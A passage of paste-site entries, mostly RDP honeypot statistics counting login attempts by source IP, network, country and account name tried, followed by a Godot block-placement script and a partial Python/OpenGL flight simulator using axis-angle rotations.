    ""87.251.75.145"": 9,
    ""130.162.52.206"": 6,
    ""64.227.155.120"": 3,
    ""185.170.144.113"": 36,
    ""194.165.16.37"": 6,
    ""167.94.146.57"": 3,
    ""185.170.144.3"": 3,
    ""209.222.98.33"": 9,
    ""198.235.24.185"": 9,
    ""162.248.102.225"": 3,
    ""3.16.147.134"": 6,
    ""135.125.216.200"": 3,
    ""89.187.175.23"": 3,
    ""212.70.149.146"": 9,
    ""152.32.149.246"": 3,
    ""15.204.9.251"": 3,
    ""155.159.254.132"": 3,
    ""198.235.24.58"": 9,
    ""14.39.154.231"": 3,
    ""45.227.254.49"": 6,
    ""212.102.40.36"": 3,
    ""87.251.75.64"": 3,
    ""173.255.249.242"": 12,
    ""143.110.136.35"": 3,
    ""154.53.167.3"": 3,
    ""167.94.138.49"": 3,
    ""106.246.227.18"": 6,
    ""198.235.24.235"": 9,
    ""147.78.47.31"": 3,
    ""142.4.218.114"": 3,
    ""110.86.3.66"": 3,
    ""91.240.118.29"": 3
  },
  ""asn"": {
    ""AS140810"": 222,
    ""AS209132"": 12,
    ""AS135746"": 3,
    ""AS132203"": 3,
    ""AS138152"": 3,
    ""AS4134"": 15,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS209588"": 6,
    ""AS208091"": 12,
    ""AS31898"": 6,
    ""AS14061"": 6,
    ""AS197414"": 39,
    ""AS48721"": 6,
    ""AS398705"": 3,
    ""AS23470"": 9,
    ""AS397031"": 3,
    ""AS16509"": 6,
    ""AS16276"": 9,
    ""AS60068"": 6,
    ""AS204428"": 9,
    ""AS135377"": 3,
    ""AS137951"": 3,
    ""AS4766"": 3,
    ""AS267784"": 6,
    ""AS63949"": 12,
    ""AS62425"": 3,
    ""AS398324"": 3,
    ""AS3786"": 6,
    ""AS57523"": 3
  },
  ""isp"": {
    ""VPSTTT"": 222,
    ""Alviva Holding Limited"": 12,
    ""Cityline Networks Pvt Ltd"": 3,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Yisu Cloud LTD"": 3,
    ""Chinanet"": 15,
    ""Horizon LLC"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 18,
    ""Xhost Internet Solutions LP"": 51,
    ""Oracle Corporation"": 6,
    ""DigitalOcean, LLC"": 6,
    ""Censys, Inc."": 6,
    ""ReliableSite.Net LLC"": 9,
    ""GALAXYGATE, LLC"": 3,
    ""Amazon.com, Inc."": 6,
    ""OVH SAS"": 9,
    ""Datacamp Limited"": 6,
    ""SS-Net"": 9,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Clayer Limited"": 3,
    ""Korea Telecom"": 3,
    ""Akamai Technologies, Inc."": 12,
    ""Mailbox Internet Hizmetleri Ltd. Sti."": 3,
    ""LG DACOM Corporation"": 6,
    ""Chang Way Technologies Co. Limited"": 3
  },
  ""org"": {
    ""VPSTTT Technology Company Limited"": 222,
    ""FutureNow Incorporated"": 12,
    ""Cityline Networks Pvt Ltd"": 3,
    ""Tencent Cloud Computing"": 3,
    ""SHENGYD(HK)LIMITED"": 3,
    ""Chinanet JS"": 12,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 12,
    ""Xhost Internet Solutions"": 12,
    ""Oracle Cloud Infrastructure (eu-frankfurt-1)"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Xhostis"": 39,
    ""Censys, Inc."": 3,
    ""ReliableSite.Net LLC"": 9,
    ""GALAXYGATE, LLC"": 3,
    ""AWS EC2 (us-east-2)"": 6,
    ""OVH GmbH"": 3,
    ""DataCamp Limited"": 3,
    ""4Media Ltd"": 9,
    ""Ucloud Information Technology"": 3,
    ""OVH US LLC"": 3,
    ""Safren Computer Services"": 3,
    ""Kornet"": 3,
    ""UAB Host Baltic"": 6,
    ""Cdn77 DAL"": 3,
    ""Linode"": 12,
    ""Digital Ocean"": 3,
    ""Kuzey Veri Merkezi Anonim Sirketi"": 3,
    ""Censys, Inc"": 3,
    ""Boranet"": 6,
    ""OVH Hosting, Inc."": 3,
    ""Chinanet FJ"": 3,
    ""Chang Way Technologies Co. Limited"": 3
  },
  ""regionName"": {
    ""Ho Chi Minh"": 222,
    ""English River"": 12,
    ""Uttar Pradesh"": 3,
    ""North West"": 3,
    ""Wan Chai"": 3,
    ""Jiangsu"": 12,
    ""Moscow"": 21,
    ""California"": 51,
    ""Drenthe"": 3,
    ""North Holland"": 54,
    ""Hesse"": 12,
    ""Karnataka"": 3,
    ""Kaunas"": 6,
    ""New Jersey"": 9,
    ""Texas"": 9,
    ""Ohio"": 6,
    ""Plovdiv"": 9,
    ""Virginia"": 3,
    ""Oregon"": 3,
    ""Illinois"": 3,
    ""Seoul"": 3,
    ""Vilnius"": 6,
    ""Istanbul"": 3,
    ""Michigan"": 3,
    ""Gyeonggi-do"": 6,
    ""Quebec"": 3,
    ""Fujian"": 3
  },
  ""country"": {
    ""Vietnam"": 222,
    ""Seychelles"": 12,
    ""India"": 6,
    ""Singapore"": 3,
    ""Hong Kong"": 3,
    ""China"": 15,
    ""Russia"": 21,
    ""United States"": 87,
    ""The Netherlands"": 57,
    ""Germany"": 12,
    ""Lithuania"": 12,
    ""Bulgaria"": 9,
    ""South Korea"": 9,
    ""T\u00fcrkiye"": 3,
    ""Canada"": 3
  },
  ""account"": {
    ""hello"": 282,
    ""z1cyqaj2"": 12,
    ""Test"": 27,
    ""lXCdHtmvU"": 3,
    ""zaygvi"": 3,
    ""gvUqlR"": 3,
    ""Administr"": 24,
    ""Domain"": 57,
    ""(empty)"": 15,
    ""WsabIeoVH"": 3,
    ""FwdRwG"": 3,
    ""qbqfrU"": 3,
    ""Administrator"": 6,
    ""osXxxfaNh"": 3,
    ""rrdLTP"": 3,
    ""SwaxxL"": 3,
    ""n01myvi4"": 12,
    ""beio"": 3,
    ""ajfqLtWYT"": 3,
    ""PJadrG"": 3,
    ""giZItv"": 3
  },
  ""keyboard"": {
    ""Unknown"": 474
  },
  ""client_build"": {
    ""Unknown"": 474
  },
  ""client_name"": {
    ""Unknown"": 474
  },
  ""ip_type"": {
    ""Unknown"": 351,
    ""hosting"": 87,
    ""proxy"": 24,
    ""hosting & proxy"": 9,
    ""mobile"": 3
  }
}"
7skk3fzu,2023-12-19_stats.json,rdp_snitch,JSON,Tuesday 19th of December 2023 06:16:17 PM CDT,"{
  ""ip"": {
    ""103.178.235.43"": 148,
    ""88.214.26.3"": 8,
    ""103.76.139.213"": 2,
    ""43.156.144.223"": 2,
    ""103.142.86.61"": 2,
    ""58.218.204.183"": 8,
    ""62.204.41.208"": 12,
    ""205.210.31.169"": 6,
    ""141.98.81.79"": 2,
    ""87.251.75.145"": 6,
    ""130.162.52.206"": 4,
    ""64.227.155.120"": 2,
    ""185.170.144.113"": 24,
    ""194.165.16.37"": 4,
    ""167.94.146.57"": 2,
    ""185.170.144.3"": 2,
    ""209.222.98.33"": 6,
    ""198.235.24.185"": 6,
    ""162.248.102.225"": 2,
    ""3.16.147.134"": 4,
    ""135.125.216.200"": 2,
    ""89.187.175.23"": 2,
    ""212.70.149.146"": 6,
    ""152.32.149.246"": 2,
    ""15.204.9.251"": 2,
    ""155.159.254.132"": 2,
    ""198.235.24.58"": 6,
    ""14.39.154.231"": 2,
    ""45.227.254.49"": 4,
    ""212.102.40.36"": 2,
    ""87.251.75.64"": 2,
    ""173.255.249.242"": 8,
    ""143.110.136.35"": 2,
    ""154.53.167.3"": 2,
    ""167.94.138.49"": 2,
    ""106.246.227.18"": 4,
    ""198.235.24.235"": 6,
    ""147.78.47.31"": 2,
    ""142.4.218.114"": 2,
    ""110.86.3.66"": 2,
    ""91.240.118.29"": 2
  },
  ""asn"": {
    ""AS140810"": 148,
    ""AS209132"": 8,
    ""AS135746"": 2,
    ""AS132203"": 2,
    ""AS138152"": 2,
    ""AS4134"": 10,
    ""AS59425"": 12,
    ""AS396982"": 24,
    ""AS209588"": 4,
    ""AS208091"": 8,
    ""AS31898"": 4,
    ""AS14061"": 4,
    ""AS197414"": 26,
    ""AS48721"": 4,
    ""AS398705"": 2,
    ""AS23470"": 6,
    ""AS397031"": 2,
    ""AS16509"": 4,
    ""AS16276"": 6,
    ""AS60068"": 4,
    ""AS204428"": 6,
    ""AS135377"": 2,
    ""AS137951"": 2,
    ""AS4766"": 2,
    ""AS267784"": 4,
    ""AS63949"": 8,
    ""AS62425"": 2,
    ""AS398324"": 2,
    ""AS3786"": 4,
    ""AS57523"": 2
  },
  ""isp"": {
    ""VPSTTT"": 148,
    ""Alviva Holding Limited"": 8,
    ""Cityline Networks Pvt Ltd"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""Yisu Cloud LTD"": 2,
    ""Chinanet"": 10,
    ""Horizon LLC"": 12,
    ""Google LLC"": 24,
    ""Flyservers S.A."": 12,
    ""Xhost Internet Solutions LP"": 34,
    ""Oracle Corporation"": 4,
    ""DigitalOcean, LLC"": 4,
    ""Censys, Inc."": 4,
    ""ReliableSite.Net LLC"": 6,
    ""GALAXYGATE, LLC"": 2,
    ""Amazon.com, Inc."": 4,
    ""OVH SAS"": 6,
    ""Datacamp Limited"": 4,
    ""SS-Net"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Clayer Limited"": 2,
    ""Korea Telecom"": 2,
    ""Akamai Technologies, Inc."": 8,
    ""Mailbox Internet Hizmetleri Ltd. Sti."": 2,
    ""LG DACOM Corporation"": 4,
    ""Chang Way Technologies Co. Limited"": 2
  },
  ""org"": {
    ""VPSTTT Technology Company Limited"": 148,
    ""FutureNow Incorporated"": 8,
    ""Cityline Networks Pvt Ltd"": 2,
    ""Tencent Cloud Computing"": 2,
    ""SHENGYD(HK)LIMITED"": 2,
    ""Chinanet JS"": 8,
    ""Horizon LLC"": 12,
    ""Palo Alto Networks, Inc"": 24,
    ""Flyservers S.A"": 8,
    ""Xhost Internet Solutions"": 8,
    ""Oracle Cloud Infrastructure (eu-frankfurt-1)"": 4,
    ""DigitalOcean, LLC"": 2,
    ""Xhostis"": 26,
    ""Censys, Inc."": 2,
    ""ReliableSite.Net LLC"": 6,
    ""GALAXYGATE, LLC"": 2,
    ""AWS EC2 (us-east-2)"": 4,
    ""OVH GmbH"": 2,
    ""DataCamp Limited"": 2,
    ""4Media Ltd"": 6,
    ""Ucloud Information Technology"": 2,
    ""OVH US LLC"": 2,
    ""Safren Computer Services"": 2,
    ""Kornet"": 2,
    ""UAB Host Baltic"": 4,
    ""Cdn77 DAL"": 2,
    ""Linode"": 8,
    ""Digital Ocean"": 2,
    ""Kuzey Veri Merkezi Anonim Sirketi"": 2,
    ""Censys, Inc"": 2,
    ""Boranet"": 4,
    ""OVH Hosting, Inc."": 2,
    ""Chinanet FJ"": 2,
    ""Chang Way Technologies Co. Limited"": 2
  },
  ""regionName"": {
    ""Ho Chi Minh"": 148,
    ""English River"": 8,
    ""Uttar Pradesh"": 2,
    ""North West"": 2,
    ""Wan Chai"": 2,
    ""Jiangsu"": 8,
    ""Moscow"": 14,
    ""California"": 34,
    ""Drenthe"": 2,
    ""North Holland"": 36,
    ""Hesse"": 8,
    ""Karnataka"": 2,
    ""Kaunas"": 4,
    ""New Jersey"": 6,
    ""Texas"": 6,
    ""Ohio"": 4,
    ""Plovdiv"": 6,
    ""Virginia"": 2,
    ""Oregon"": 2,
    ""Illinois"": 2,
    ""Seoul"": 2,
    ""Vilnius"": 4,
    ""Istanbul"": 2,
    ""Michigan"": 2,
    ""Gyeonggi-do"": 4,
    ""Quebec"": 2,
    ""Fujian"": 2
  },
  ""country"": {
    ""Vietnam"": 148,
    ""Seychelles"": 8,
    ""India"": 4,
    ""Singapore"": 2,
    ""Hong Kong"": 2,
    ""China"": 10,
    ""Russia"": 14,
    ""United States"": 58,
    ""The Netherlands"": 38,
    ""Germany"": 8,
    ""Lithuania"": 8,
    ""Bulgaria"": 6,
    ""South Korea"": 6,
    ""T\u00fcrkiye"": 2,
    ""Canada"": 2
  },
  ""account"": {
    ""hello"": 188,
    ""z1cyqaj2"": 8,
    ""Test"": 18,
    ""lXCdHtmvU"": 2,
    ""zaygvi"": 2,
    ""gvUqlR"": 2,
    ""Administr"": 16,
    ""Domain"": 38,
    ""(empty)"": 10,
    ""WsabIeoVH"": 2,
    ""FwdRwG"": 2,
    ""qbqfrU"": 2,
    ""Administrator"": 4,
    ""osXxxfaNh"": 2,
    ""rrdLTP"": 2,
    ""SwaxxL"": 2,
    ""n01myvi4"": 8,
    ""beio"": 2,
    ""ajfqLtWYT"": 2,
    ""PJadrG"": 2,
    ""giZItv"": 2
  },
  ""keyboard"": {
    ""Unknown"": 316
  },
  ""client_build"": {
    ""Unknown"": 316
  },
  ""client_name"": {
    ""Unknown"": 316
  },
  ""ip_type"": {
    ""Unknown"": 234,
    ""hosting"": 58,
    ""proxy"": 16,
    ""hosting & proxy"": 6,
    ""mobile"": 2
  }
}"
2gwTtvPu,2023-12-19_stats.json,rdp_snitch,JSON,Tuesday 19th of December 2023 06:15:09 PM CDT,"{
  ""ip"": {
    ""103.178.235.43"": 74,
    ""88.214.26.3"": 4,
    ""103.76.139.213"": 1,
    ""43.156.144.223"": 1,
    ""103.142.86.61"": 1,
    ""58.218.204.183"": 4,
    ""62.204.41.208"": 6,
    ""205.210.31.169"": 3,
    ""141.98.81.79"": 1,
    ""87.251.75.145"": 3,
    ""130.162.52.206"": 2,
    ""64.227.155.120"": 1,
    ""185.170.144.113"": 12,
    ""194.165.16.37"": 2,
    ""167.94.146.57"": 1,
    ""185.170.144.3"": 1,
    ""209.222.98.33"": 3,
    ""198.235.24.185"": 3,
    ""162.248.102.225"": 1,
    ""3.16.147.134"": 2,
    ""135.125.216.200"": 1,
    ""89.187.175.23"": 1,
    ""212.70.149.146"": 3,
    ""152.32.149.246"": 1,
    ""15.204.9.251"": 1,
    ""155.159.254.132"": 1,
    ""198.235.24.58"": 3,
    ""14.39.154.231"": 1,
    ""45.227.254.49"": 2,
    ""212.102.40.36"": 1,
    ""87.251.75.64"": 1,
    ""173.255.249.242"": 4,
    ""143.110.136.35"": 1,
    ""154.53.167.3"": 1,
    ""167.94.138.49"": 1,
    ""106.246.227.18"": 2,
    ""198.235.24.235"": 3,
    ""147.78.47.31"": 1,
    ""142.4.218.114"": 1,
    ""110.86.3.66"": 1,
    ""91.240.118.29"": 1
  },
  ""asn"": {
    ""AS140810"": 74,
    ""AS209132"": 4,
    ""AS135746"": 1,
    ""AS132203"": 1,
    ""AS138152"": 1,
    ""AS4134"": 5,
    ""AS59425"": 6,
    ""AS396982"": 12,
    ""AS209588"": 2,
    ""AS208091"": 4,
    ""AS31898"": 2,
    ""AS14061"": 2,
    ""AS197414"": 13,
    ""AS48721"": 2,
    ""AS398705"": 1,
    ""AS23470"": 3,
    ""AS397031"": 1,
    ""AS16509"": 2,
    ""AS16276"": 3,
    ""AS60068"": 2,
    ""AS204428"": 3,
    ""AS135377"": 1,
    ""AS137951"": 1,
    ""AS4766"": 1,
    ""AS267784"": 2,
    ""AS63949"": 4,
    ""AS62425"": 1,
    ""AS398324"": 1,
    ""AS3786"": 2,
    ""AS57523"": 1
  },
  ""isp"": {
    ""VPSTTT"": 74,
    ""Alviva Holding Limited"": 4,
    ""Cityline Networks Pvt Ltd"": 1,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""Yisu Cloud LTD"": 1,
    ""Chinanet"": 5,
    ""Horizon LLC"": 6,
    ""Google LLC"": 12,
    ""Flyservers S.A."": 6,
    ""Xhost Internet Solutions LP"": 17,
    ""Oracle Corporation"": 2,
    ""DigitalOcean, LLC"": 2,
    ""Censys, Inc."": 2,
    ""ReliableSite.Net LLC"": 3,
    ""GALAXYGATE, LLC"": 1,
    ""Amazon.com, Inc."": 2,
    ""OVH SAS"": 3,
    ""Datacamp Limited"": 2,
    ""SS-Net"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Clayer Limited"": 1,
    ""Korea Telecom"": 1,
    ""Akamai Technologies, Inc."": 4,
    ""Mailbox Internet Hizmetleri Ltd. Sti."": 1,
    ""LG DACOM Corporation"": 2,
    ""Chang Way Technologies Co. Limited"": 1
  },
  ""org"": {
    ""VPSTTT Technology Company Limited"": 74,
    ""FutureNow Incorporated"": 4,
    ""Cityline Networks Pvt Ltd"": 1,
    ""Tencent Cloud Computing"": 1,
    ""SHENGYD(HK)LIMITED"": 1,
    ""Chinanet JS"": 4,
    ""Horizon LLC"": 6,
    ""Palo Alto Networks, Inc"": 12,
    ""Flyservers S.A"": 4,
    ""Xhost Internet Solutions"": 4,
    ""Oracle Cloud Infrastructure (eu-frankfurt-1)"": 2,
    ""DigitalOcean, LLC"": 1,
    ""Xhostis"": 13,
    ""Censys, Inc."": 1,
    ""ReliableSite.Net LLC"": 3,
    ""GALAXYGATE, LLC"": 1,
    ""AWS EC2 (us-east-2)"": 2,
    ""OVH GmbH"": 1,
    ""DataCamp Limited"": 1,
    ""4Media Ltd"": 3,
    ""Ucloud Information Technology"": 1,
    ""OVH US LLC"": 1,
    ""Safren Computer Services"": 1,
    ""Kornet"": 1,
    ""UAB Host Baltic"": 2,
    ""Cdn77 DAL"": 1,
    ""Linode"": 4,
    ""Digital Ocean"": 1,
    ""Kuzey Veri Merkezi Anonim Sirketi"": 1,
    ""Censys, Inc"": 1,
    ""Boranet"": 2,
    ""OVH Hosting, Inc."": 1,
    ""Chinanet FJ"": 1,
    ""Chang Way Technologies Co. Limited"": 1
  },
  ""regionName"": {
    ""Ho Chi Minh"": 74,
    ""English River"": 4,
    ""Uttar Pradesh"": 1,
    ""North West"": 1,
    ""Wan Chai"": 1,
    ""Jiangsu"": 4,
    ""Moscow"": 7,
    ""California"": 17,
    ""Drenthe"": 1,
    ""North Holland"": 18,
    ""Hesse"": 4,
    ""Karnataka"": 1,
    ""Kaunas"": 2,
    ""New Jersey"": 3,
    ""Texas"": 3,
    ""Ohio"": 2,
    ""Plovdiv"": 3,
    ""Virginia"": 1,
    ""Oregon"": 1,
    ""Illinois"": 1,
    ""Seoul"": 1,
    ""Vilnius"": 2,
    ""Istanbul"": 1,
    ""Michigan"": 1,
    ""Gyeonggi-do"": 2,
    ""Quebec"": 1,
    ""Fujian"": 1
  },
  ""country"": {
    ""Vietnam"": 74,
    ""Seychelles"": 4,
    ""India"": 2,
    ""Singapore"": 1,
    ""Hong Kong"": 1,
    ""China"": 5,
    ""Russia"": 7,
    ""United States"": 29,
    ""The Netherlands"": 19,
    ""Germany"": 4,
    ""Lithuania"": 4,
    ""Bulgaria"": 3,
    ""South Korea"": 3,
    ""T\u00fcrkiye"": 1,
    ""Canada"": 1
  },
  ""account"": {
    ""hello"": 94,
    ""z1cyqaj2"": 4,
    ""Test"": 9,
    ""lXCdHtmvU"": 1,
    ""zaygvi"": 1,
    ""gvUqlR"": 1,
    ""Administr"": 8,
    ""Domain"": 19,
    ""(empty)"": 5,
    ""WsabIeoVH"": 1,
    ""FwdRwG"": 1,
    ""qbqfrU"": 1,
    ""Administrator"": 2,
    ""osXxxfaNh"": 1,
    ""rrdLTP"": 1,
    ""SwaxxL"": 1,
    ""n01myvi4"": 4,
    ""beio"": 1,
    ""ajfqLtWYT"": 1,
    ""PJadrG"": 1,
    ""giZItv"": 1
  },
  ""keyboard"": {
    ""Unknown"": 158
  },
  ""client_build"": {
    ""Unknown"": 158
  },
  ""client_name"": {
    ""Unknown"": 158
  },
  ""ip_type"": {
    ""Unknown"": 117,
    ""hosting"": 29,
    ""proxy"": 8,
    ""hosting & proxy"": 3,
    ""mobile"": 1
  }
}"
W59FH47U,Untitled,Socky,GDScript,Tuesday 19th of December 2023 06:06:15 PM CDT,"extends Node
 
var object = null
 
var radius := 2
var map := {}
 
var putPos : Vector3 = Vector3.ZERO
 
var t = [""block1""]
 
func _mouse_pos():
	var camera = $Camera3D
	var mouse = get_viewport().get_mouse_position()
	var result = camera.project_position(mouse, 10.0)
	return Vector3(result.x, 0, result.z).snapped(Vector3(1,0.5,1))
	
func _ready():
	_spawn_block()
	
func _physics_process(delta):
	var tar = _mouse_pos() - Vector3(object.size.x/2, 0, object.size.z/2)
	var p = _update_target(tar, object)
	object.global_position = putPos
	
	if Input.is_action_just_pressed(""ui_accept""):
		if !p: return
		_mark_block(putPos, object.size)
		_spawn_block()
		
func _spawn_block():
	var x = t[randi() % t.size()]
	var loaded = load(""res://%s.tscn"" % x)
	object = loaded.instantiate()
	object.get_child(0).position = Vector3(object.size.x/2, 0, object.size.z/2)
	object.get_child(0).material.albedo_color = Color(randi_range(0,4),randi_range(0,4),randi_range(0,4),1)
	add_child(object)
		
func _update_target(target: Vector3, block: Node3D):
	var check = false
	var range = _get_radius(target)
	var c = null
	for i in range:
		var hasBlock = _has_block(i, block.size)
		if not hasBlock and (c == null or i.distance_to(target) < c.distance_to(target)):
			check = true
			c = i
	if c != null: putPos = c
	return check
 
func _get_radius(target: Vector3):
	var result := []
	for x in range(-radius, radius + 1):
		for z in range(-radius, radius + 1):
			var point = Vector3(target.x + x, 0, target.z + z)
			result.append(point)
	return result
	
func _has_block(p: Vector3, s: Vector3):
	for x in range(s.x):
		for z in range(s.z):
			var key = Vector3(p.x + x, p.y, p.z + z)
			if map.has(key):
				return true
	return false
	
func _mark_block(p: Vector3, s: Vector3):
	for x in range(s.x):
		for z in range(s.z):
			map[Vector3(p.x + x, p.y, p.z + z)] = object
"
rbubwA3d,QUATERNION_RODRIGUES_ALTMANN_COMPOSITE_AXIS_ANGLE_ROTATION,mechanizmos58,Python,Tuesday 19th of December 2023 05:59:10 PM CDT,"'''

MULTIPLE COMPOSITE AXIS-ANGLE ROTATION MICRO FLIGHT SIMULATOR

# 07_10_23
# ...
# 11_11_23 # SUCCESS! NO MORE EULER ANGLES - ROTATION ORDER DOESN'T MATTER NOW
# 14_12_23 # from numpy..., glMultMatrix...
# 20_12_23

# MOUSE & KEYS
#
UP KEY - INCREASE VELOCITY
DOWN KEY - BRAKE
MOUSE LEFT, RIGHT - TURN
MOUSE UP, DOWN - PITCH
LEFT, RIGHT KEYS - ROLL
PAUSE, BREAK - PAUSE
SPACE -  VELOCITY = 0
ENTER, ESC - EXIT

'''

from math import acos, degrees, sin, cos, sqrt
from numpy import append, arange, array, concatenate, identity
from numpy import outer, zeros, hstack, vstack, empty
from OpenGL.GL import *
from OpenGL.GLU import *
import pygame
from pygame.locals import *
import sys


def main():

    # ~ print()
    # ~ print(rotate_r.__doc__)
    # ~ print()
    # ~ print(composite_rotation.__doc__)
    # ~ print(rotation_matrix_4x4.__doc__)

    # ~ clock = pygame.time.Clock()

    screenwidth = 1920
    screenheight = 1080
    sw2 = screenwidth/2.0
    sh2 = screenheight/2.0

    pygame.init()
    pygame.display.set_caption('ESC or RETURN exits')
    gl_init(screenwidth, screenheight, FULL_SCREEN=1)

    make_hoops1()
    make_hoops2()
    make_ground()

    pygame.mouse.set_visible(0)
    pygame.mouse.set_pos([sw2, sh2])

    PAUSE = 0
    JOYSTICK = 0

    I3 = identity(3)
    I4 = identity(4)
    Z3 = zeros((3,3))
    Z4 = zeros((4,4))
    vec3 = empty((3))

    pos = array([0.0, 170.0, 600.0])

    velocity = 0.0
    Phi = 0.0
    Theta = 0.0
    Psi = 0.0

    R = array([1.0, 0.0, 0.0]) # RIGHT (E1)
    U = array([0.0, 1.0, 0.0]) # UP (E2)
    B = array([0.0, 0.0, 1.0]) # BACK (E3)

    glTranslate(0.0, 0.0, -5.0)

    if JOYSTICK:
        joystick = pygame.joystick.Joystick(0)
        joystick.init()

    while 1:

        KEYS = pygame.key.get_pressed()

        if KEYS[K_UP]:
            velocity += 0.08
            if velocity > 8.0:
                velocity = 8.0

        if KEYS[K_DOWN]:
            velocity -= 0.04
            if velocity < 0.0:
                velocity = 0.0

        for event in pygame.event.get():

            if event.type == QUIT:
                pygame.quit()
                return

            elif event.type == KEYDOWN:
                if event.key in [K_ESCAPE, K_RETURN]:
                    pygame.quit()
                    return
                elif event.key == K_PAUSE:
                    PAUSE ^= 1
                elif event.key == K_SPACE:
                    velocity = 0.0

        if PAUSE: continue

        glClear(GL_COLOR_BUFFER_BIT|GL_DEPTH_BUFFER_BIT)

        mousex, mousey = pygame.mouse.get_pos()

        if JOYSTICK:
            # YAW (LEFT, RIGHT)
            Phi  = joystick.get_axis(2) / 80.0
            # PITCH (UP, DOWN)
            Theta = -joystick.get_axis(1) / 80.0
            # ROLL (CW, CCW)
            Psi = -joystick.get_axis(0) / 100.0
        else:
            # YAW (LEFT, RIGHT)
            Phi = (mousex - sw2) / 1.0e5
            # PITCH (UP, DOWN)
            Theta = (mousey - sh2) / 5.0e4
            # ROLL (CW, CCW)
            Psi = 0.0
            if KEYS[K_LEFT]:
                Psi = 0.01
            if KEYS[K_RIGHT]:
                Psi = -0.01

        # COMPOSE A SINGLE ANGLE-AXIS ROTATION FROM BODY FRAME AXIS ROTATIONS
        # (ORDER DOESN'T MATTER)
        #
        Gamma, E = composite_rotation(-B, Psi, U, Phi, vec3)
        Gamma, E = composite_rotation(E, Gamma, R, Theta, vec3)

        if 1:
            C = rotation_matrix_4x4(Gamma, E, I4, Z4)
            glMultMatrixd(C)
        else:
            glRotatef(degrees(Gamma), *E)

        R = rotate_r(R, E, -Gamma, vec3)
        U = rotate_r(U, E, -Gamma, vec3)
        B = rotate_r(B, E, -Gamma, vec3)

        glPushMatrix()

        pos += -B * velocity
        glTranslatef(*-pos)

        glColor3f(0.0, 0.0, 1.0)
        glCallList(g.hatch_ground)
        glColor3f(0.7, 0.0, 0.0)
        glCallList(g.square_hoops1)
        glColor3f(0.0, 0.7, 0.7)
        glCallList(g.square_hoops2)

        glPopMatrix()

        pygame.display.flip()
        pygame.time.wait(10)
        # ~ clock.tick(100)


def normalize(v):
    norm = sqrt(v[0]**2 + v[1]**2 + v[2]**2)
    if norm > 0.0:
        return v / norm
    return v


def magnitude(v):
    return sqrt(v[0]**2 + v[1]**2 + v[2]**2)


def npcross(u, v):
    x = u[1]*v[2] - u[2]*v[1]
    y = u[2]*v[0] - u[0]*v[2]
    z = u[0]*v[1] - u[1]*v[0]
    return array([x,y,z])


def rotate_r(r, e, 𝚹, cross_er):

    """"""

 Rodrigues finite rotation formula for numpy

 Rodrigues' rotation formula, Wikipedia

 Rotation Transforms for Computer Graphics, John Vince (2011), p.139
 Classical Mechanics, Goldstein et al. p. 162 (""the rotation formula"")
 Computer Graphics Software Construction, John R. Rankin (1989), p.279
 Quaternions for Computer Graphics, John Vince (2011) pp. 80-, 123(!)
 (Demonstrates the equivalence of Quaternion rotation and Rodrigues rotation)

 In matrix form:
 Analytical Mechanics of Space Systems by Schaub & Junkins eq.3.82 (p.105)
 in video: Axis-Angles, Euler Parameters, Quaternions Matlab Examples
   by Shane Ross (RossDynamicsLab) starting at 25 minutes
 Graphics Gems (1990), p.503-5 (Patrick-Gilles Maillot)
 Do We Really Need Quaternions? by Diana Gruber (2000)
 (Demonstrates the equivalence of the Quaternion matrix and the
    direction cosine matrix from Graphics Gems (1990),
    and Schaub & Junkins p.102, which can be generated by the
    Rodrigues matrix formulation - see def rodrigues_matrix())

Rotations, Quaternions, and Double Groups
by Simon L. Altmann (1986 book), p.159

Hamilton, Rodrigues, and the Quaternion Scandal
by Simon L. Altmann (1989 paper), p.302-3
 ""...Rodrigues's couples are, therefore, quaternions...""


 Does not check if e is normalized

 Rotation is right-hand direction

 r is the position vector to rotate
 e is the unit direction vector about which to rotate
  𝚹 is the rotation angle in radians

    """"""

    ## 26.6 microseconds
    # np.cross(e, r)

    ## 2.35 microseconds
    # x = e[1]*r[2] - e[2]*r[1]
    # y = e[2]*r[0] - e[0]*r[2]
    # z = e[0]*r[1] - e[1]*r[0]
    # cross_er = array([x, y, z])

    ## 1.42 microseconds
    e0, e1, e2 = e[0], e[1], e[2]
    r0, r1, r2 = r[0], r[1], r[2]
    cross_er[0] = e1*r2 - e2*r1
    cross_er[1] = e2*r0 - e0*r2
    cross_er[2] = e0*r1 - e1*r0

    ## 1.16 microseconds
    # dot_er = np.dot(e, r)

    ## 829 nanoseconds
    # dot_er = e[0]*r[0] + e[1]*r[1] + e[2]*r[2]

    ## 348 nanoseconds
    dot_er = e0*r0 + e1*r1 + e2*r2

    cos𝚹 = cos(𝚹)

    return r*cos𝚹 + e*dot_er*(1.0-cos𝚹) + cross_er*sin(𝚹)

    # Altmann (1986) p.163, Vince (2011) p.123 (same as above)
    # return r*cos𝚹  + sin(𝚹)*cross_er + (1.0-cos𝚹)*dot_er*e  # (4)


def composite_rotation(e1, Alpha, e2, Beta, cross_e1e2):

    """"""
COMPOSE A SINGLE AXIS-ANGLE ROTATION FROM TWO AXIS-ANGLE ROTATIONS

Olinde Rodrigues, 1840

Rotations, Quaternions, and Double Groups
by Simon L. Altmann (1986 book), p.159

Hamilton, Rodrigues, and the Quaternion Scandal
by Simon L. Altmann (1989 paper), p.302

Analytical Mechanics of Space Systems (Fourth Edition, 2018)
by Schaub & Junkins p.106 (3.85, 3.86)

Quaternions for Computer Graphics (2011) by John Vince, pp.90-91 (7.1, 7.2)

    """"""

    sinAlpha = sin(Alpha / 2.0)
    sinBeta =  sin(Beta / 2.0)
    cosAlpha = cos(Alpha / 2.0)
    cosBeta =  cos(Beta / 2.0)

    e10, e11, e12 = e1[0], e1[1], e1[2]
    e20, e21, e22 = e2[0], e2[1], e2[2]

    cross_e1e2[0] = e11*e22 - e12*e21
    cross_e1e2[1] = e12*e20 - e10*e22
    cross_e1e2[2] = e10*e21 - e11*e20

    dot_e1e2 = e10*e20 + e11*e21 + e12*e22

    sinAlpha_sinBeta = sinAlpha*sinBeta

